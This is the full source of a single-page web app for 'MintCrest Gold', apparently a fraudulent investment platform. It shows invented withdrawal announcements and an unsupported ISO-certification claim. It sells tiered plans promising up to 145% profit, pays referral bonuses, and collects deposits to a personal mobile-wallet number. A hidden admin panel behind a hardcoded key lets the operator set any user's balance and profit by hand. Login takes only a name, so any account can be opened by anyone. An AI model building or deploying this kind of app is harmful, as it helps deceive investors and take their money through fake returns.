<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Global Trusted Assets</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .ticker-wrap { background: rgba(59, 130, 246, 0.1); overflow: hidden; white-space: nowrap; padding: 5px 0; border-bottom: 1px solid rgba(59, 130, 246, 0.2); }
        .ticker { display: inline-block; animation: ticker 20s linear infinite; font-size: 10px; font-weight: bold; color: #60a5fa; text-transform: uppercase; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .badge-pending { @apply bg-yellow-500/20 text-yellow-500 px-2 py-0.5 rounded text-[8px] font-bold; }
        .badge-approved { @apply bg-green-500/20 text-green-400 px-2 py-0.5 rounded text-[8px] font-bold; }
        .badge-rejected { @apply bg-red-500/20 text-red-500 px-2 py-0.5 rounded text-[8px] font-bold; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div class="ticker-wrap">
        <div class="ticker">
            🚀 Breaking: User 'Zeeshan' just withdrew ₨ 45,000 • New Tier 25 Plans Live • 24/7 Withdrawal Processing Active • MintCrest is ISO Certified 
        </div>
    </div>

    <section id="auth-ui" class="h-full flex items-center justify-center p-6 bg-[#010409] z-[1000] absolute inset-0">
        <div class="glass w-full max-w-sm p-10 rounded-[3rem] text-center border-t-8 border-blue-600 shadow-2xl">
            <h1 id="mobile-admin-trigger" onclick="adminTap()" class="text-3xl font-black italic tracking-tighter mb-2">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[10px] uppercase tracking-widest mb-10">Secure Institutional Access</p>
            <input type="text" id="user-name" placeholder="Your Full Name" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 outline-none text-center mb-4 font-bold">
            <button onclick="login()" class="w-full bg-blue-600 py-4 rounded-2xl font-bold shadow-xl active:scale-95 transition">OPEN PORTFOLIO</button>
            <p class="text-[8px] text-gray-600 mt-6 uppercase tracking-widest">© 2026 MintCrest Enterprise | Global Assets</p>
        </div>
    </section>

    <div id="app-ui" class="hidden flex-1 overflow-y-auto pb-24">
        
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-8 rounded-[2.5rem] mb-6 border-l-4 border-blue-600 relative overflow-hidden">
                <div class="absolute top-0 right-0 p-4 opacity-10">🛡️</div>
                <p class="text-[10px] text-gray-500 font-bold mb-1 uppercase tracking-widest">Wallet Balance</p>
                <h2 class="text-5xl font-black tracking-tighter text-blue-500" id="v-bal">₨ 0</h2>
                <div class="flex gap-2 mt-4">
                    <span class="text-[9px] bg-green-500/20 text-green-400 px-3 py-1 rounded-full font-bold uppercase tracking-wide">Profit: <span id="v-profit">₨ 0</span></span>
                    <span class="text-[9px] bg-blue-500/20 text-blue-400 px-3 py-1 rounded-full font-bold uppercase tracking-wide">Verified User</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="changePage('wallet')" class="glass p-6 rounded-3xl text-center border-b-2 border-blue-500 active:scale-95 transition">📥<br><span class="text-[10px] font-bold uppercase mt-2 block tracking-widest">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-6 rounded-3xl text-center border-b-2 border-red-500 active:scale-95 transition">📤<br><span class="text-[10px] font-bold uppercase mt-2 block tracking-widest">Withdraw</span></button>
            </div>

            <div class="glass p-6 rounded-3xl mb-8 border border-blue-500/20">
                <h4 class="text-[10px] font-bold text-blue-400 mb-2 uppercase tracking-widest">Invite & Earn 10%</h4>
                <div class="flex gap-2">
                    <input type="text" id="ref-link" readonly class="flex-1 bg-white/5 p-2 rounded text-[10px] outline-none border border-white/5" value="Loading...">
                    <button onclick="copyRef()" class="bg-blue-600 px-3 rounded font-bold text-[10px]">COPY</button>
                </div>
            </div>

            <h3 class="text-[10px] font-bold text-gray-500 mb-4 uppercase tracking-[0.3em] text-center">Live Transaction Log</h3>
            <div id="user-history" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-xl font-black italic mb-6 text-center">INVESTMENT <span class="text-blue-500">TIERS</span></h2>
            <div id="plans-list" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6">
            <div class="space-y-4">
                <div class="glass p-6 rounded-3xl">
                    <h3 class="font-bold text-blue-500 mb-2">Support Centre</h3>
                    <p class="text-[10px] text-gray-400 mb-4">Contact: webhub262@gmail.com</p>
                    <input type="text" placeholder="Subject" class="w-full bg-white/5 p-3 rounded-xl border border-white/10 mb-2 outline-none text-xs">
                    <textarea placeholder="Your Message" class="w-full bg-white/5 p-3 rounded-xl border border-white/10 mb-4 outline-none text-xs h-20"></textarea>
                    <button class="w-full bg-blue-600 py-3 rounded-xl font-bold text-[10px]">SEND MESSAGE</button>
                </div>

                <div class="glass p-6 rounded-3xl">
                    <h3 class="font-bold text-blue-500 mb-2">Legal & Privacy</h3>
                    <div class="space-y-2">
                        <button onclick="alert('Privacy Policy: We encrypt all your data and never share your TID or balance info with third parties.')" class="w-full text-left p-3 glass rounded-xl text-[10px] font-bold uppercase">Privacy Policy</button>
                        <button onclick="alert('Terms: Minimum investment ₨ 500. Profit processed every 10 days.')" class="w-full text-left p-3 glass rounded-xl text-[10px] font-bold uppercase">Terms of Service</button>
                    </div>
                </div>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3rem] border-t-8 border-blue-600 text-center">
                <h3 class="font-black italic mb-6">FUNDING PORTAL</h3>
                <div class="p-4 glass rounded-2xl mb-6">
                    <p class="text-[10px] font-bold text-gray-400">JAZZCASH/EASYPAISA</p>
                    <p class="text-2xl font-black text-blue-500">03705519562</p>
                </div>
                <input type="number" id="dep-amount" placeholder="Deposit Amount" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-3 outline-none text-center">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-6 outline-none text-center">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-xs uppercase shadow-xl">Confirm Deposit</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-8 rounded-[3rem] border-t-8 border-red-600">
                <h3 class="font-black italic text-center mb-6">WITHDRAWAL</h3>
                <input type="number" id="wd-amt" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-3 outline-none text-center">
                <input type="text" id="wd-acc" placeholder="Account Number & Name" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-6 outline-none text-center">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-5 rounded-2xl font-black text-xs uppercase shadow-xl">Request Payout</button>
            </div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#010409] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-xl font-black text-blue-500 uppercase italic">Control Room</h2><button onclick="closeAdmin()" class="text-red-500 text-xs font-bold px-4 py-2 bg-red-500/10 rounded-xl">EXIT</button></div>
        <div id="adm-req-list" class="space-y-4 mb-10"></div>
        <div class="glass p-6 rounded-3xl border border-white/5">
            <input type="text" id="adm-user" placeholder="Target Username" class="w-full bg-white/5 p-4 rounded-xl mb-2 border border-white/5 outline-none">
            <input type="number" id="adm-val" placeholder="Amount to Add" class="w-full bg-white/5 p-4 rounded-xl mb-4 border border-white/5 outline-none">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="manualEdit('balance')" class="bg-blue-600 py-4 rounded-xl font-bold text-[10px] uppercase">Cash</button>
                <button onclick="manualEdit('profit')" class="bg-green-600 py-4 rounded-xl font-bold text-[10px] uppercase">Profit</button>
            </div>
        </div>
    </div>

    <a href="https://wa.me/03379827882" class="fixed bottom-28 right-6 bg-green-500 p-4 rounded-full shadow-2xl z-[500] active:scale-90 transition">
        <svg class="w-6 h-6 fill-white" viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.588-5.946 0-6.556 5.332-11.888 11.888-11.888 3.176 0 6.161 1.237 8.404 3.48s3.48 5.228 3.48 8.404c0 6.556-5.332 11.888-11.888 11.888-2.003 0-3.968-.505-5.717-1.467l-6.306 1.692zm6.75-1.765c1.551.92 3.109 1.403 4.75 1.403 5.452 0 9.888-4.435 9.888-9.888 0-2.639-1.028-5.119-2.895-6.987s-4.349-2.895-6.993-2.895c-5.452 0-9.887 4.435-9.887 9.888 0 1.742.467 3.443 1.354 4.927l-.888 3.253 3.333-.895z"/></svg>
    </a>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-4 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-1 active-tab">🏠<span class="text-[8px] font-bold uppercase tracking-widest mt-1">Home</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-1">📈<span class="text-[8px] font-bold uppercase tracking-widest mt-1">Plans</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-1">🛠️<span class="text-[8px] font-bold uppercase tracking-widest mt-1">More</span></button>
        <button onclick="logout()" class="flex flex-col items-center gap-1 text-red-500/50">🚪<span class="text-[8px] font-bold uppercase tracking-widest mt-1">Exit</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;
        const plans = Array.from({length: 25}, (_, i) => ({ n: `Tier ${i+1}`, p: (i+1)*500, r: 25 + (i*5) }));

        window.onload = () => {
            const saved = localStorage.getItem('mintcrest_user');
            if(saved) { document.getElementById('user-name').value = saved; login(); }
        };

        function adminTap() {
            tapCount++; if(tapCount >= 3) { tapCount = 0; if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } }
            setTimeout(() => tapCount = 0, 2000);
        }

        async function login() {
            const name = document.getElementById('user-name').value.trim();
            if(!name) return; localStorage.setItem('mintcrest_user', name);
            const ref = db.collection("users").doc(name);
            const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0 });
            startSync(name);
            document.getElementById('auth-ui').style.display = 'none';
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('ref-link').value = `https://mintcrest.com/?ref=${name}`;
            renderPlans();
        }

        function copyRef() { const c = document.getElementById('ref-link'); c.select(); document.execCommand('copy'); alert("Link Copied!"); }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history');
                list.innerHTML = snap.empty ? '<p class="text-center py-10 opacity-20 text-[8px]">No records found</p>' : '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center border-l-2 ${d.type==='deposit'?'border-blue-500':'border-red-500'} mb-2"><div class="text-[10px] font-bold uppercase">${d.type}</div><div class="text-right"><p class="font-bold text-xs">₨ ${d.amount}</p><span class="badge-${d.status}">${d.status.toUpperCase()}</span></div></div>`; });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => { list.innerHTML += `<div onclick="buy(${p.p})" class="glass p-5 rounded-2xl flex justify-between items-center border-b border-white/5 active:scale-95 transition cursor-pointer mb-2"><div><h4 class="font-bold text-xs uppercase">${p.n}</h4><p class="text-[9px] text-green-400">Profit: ${p.r}%</p></div><p class="font-black text-blue-500 text-sm">₨ ${p.p.toLocaleString()}</p></div>`; });
        }

        async function submitDeposit() {
            const amt = document.getElementById('dep-amount').value;
            const trx = document.getElementById('dep-trx').value;
            if(!amt || !trx) return alert("All fields required");
            await db.collection("requests").add({ user: user.name, amount: parseInt(amt), tid: trx, type: "deposit", status: "pending", time: Date.now() });
            alert("Sent for Verification!"); changePage('home');
        }

        async function submitWithdraw() {
            const amt = document.getElementById('wd-amt').value;
            const acc = document.getElementById('wd-acc').value;
            if(!amt || !acc || amt > user.balance) return alert("Check Balance/Details");
            await db.collection("requests").add({ user: user.name, amount: parseInt(amt), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(amt) });
            alert("Withdraw Request Active!"); changePage('home');
        }

        async function buy(price) { if(user.balance < price) { alert("Low Balance!"); changePage('wallet'); } else { await db.collection("users").doc(user.name).update({ balance: user.balance - price }); alert("Investment Tier Active!"); } }

        function changePage(p) {
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
            document.querySelectorAll('nav button').forEach(btn => btn.classList.remove('active-tab'));
            document.getElementById('p-' + p).classList.add('active-page');
            const navBtn = (p==='withdraw'||p==='wallet') ? 'n-home' : 'n-'+p;
            if(document.getElementById(navBtn)) document.getElementById(navBtn).classList.add('active-tab');
        }

        function logout() { localStorage.removeItem('mintcrest_user'); location.reload(); }

        function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-req-list');
                list.innerHTML = snap.empty ? '<p class="text-center opacity-30 py-10">Clear</p>' : '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-5 rounded-2xl flex justify-between items-center border-l-4 ${d.type==='deposit'?'border-blue-500':'border-red-500'}"><div class="text-[10px] text-left"><b>${d.user}</b><br>₨ ${d.amount}<br>${d.tid || d.acc}</div><div class="flex gap-2"><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'approved', '${d.type}')" class="bg-green-600 px-4 py-2 rounded-xl text-[9px] font-black uppercase">Yes</button><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'rejected', '${d.type}')" class="bg-red-600 px-4 py-2 rounded-xl text-[9px] font-black uppercase">No</button></div></div>`; });
            });
        }

        async function handleReq(id, target, amt, action, type) {
            const ref = db.collection("users").doc(target);
            if(action === 'approved' && type === 'deposit') { const d = await ref.get(); await ref.update({ balance: (d.data().balance || 0) + amt }); }
            else if(action === 'rejected' && type === 'withdraw') { const d = await ref.get(); await ref.update({ balance: (d.data().balance || 0) + amt }); }
            await db.collection("requests").doc(id).update({ status: action });
        }

        async function manualEdit(f) { const u = document.getElementById('adm-user').value; const v = document.getElementById('adm-val').value; const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) { await ref.update({ [f]: (d.data()[f] || 0) + parseInt(v) }); alert("Updated!"); } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
    </script>
</body>
</html>
